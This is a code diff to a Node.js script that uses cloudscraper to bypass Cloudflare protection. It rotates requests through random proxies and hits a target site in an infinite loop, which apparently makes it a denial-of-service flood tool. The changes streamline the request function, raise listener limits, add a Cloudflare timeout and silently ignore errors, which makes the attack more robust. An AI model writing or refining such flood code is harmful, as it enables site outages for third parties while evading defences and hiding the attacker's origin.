@@ -1,4 +1,5 @@
 'use strict';
+require('events').EventEmitter.prototype._maxListeners = 100;
 var HttpsProxyAgent = require('https-proxy-agent');
 const cloudscraper = require('cloudscraper');
 const args = require('minimist')(process.argv.slice(2));
@@ -27,26 +28,13 @@ function getRandomInt(max) {
 }
 
 function createThread() {
-  return new Promise((resolve, reject) => {
-    try {
+  let options = { uri: site, cloudflareTimeout: 10000 };
 
-      let options = { uri: site };
+  if (useProxy) {
+    options.agent = new HttpsProxyAgent(globalProxies[getRandomInt(globalProxies.length)]);
+  }
 
-      if (useProxy) {
-        options.agent = new HttpsProxyAgent(globalProxies[getRandomInt(globalProxies.length)]);
-      }
-
-      cloudscraper.get(options, function (error, response, body) {
-        if (error) {
-          resolve('Error');
-        } else {
-          resolve('Success');
-        }
-      });
-    } catch (e) {
-      resolve('Error')
-    }
-  });
+  return cloudscraper(options);
 }
 
 async function infiniteThread() {
@@ -54,6 +42,7 @@ async function infiniteThread() {
     try {
       await createThread();
     } catch (e) {
+      
     }
   }
 }
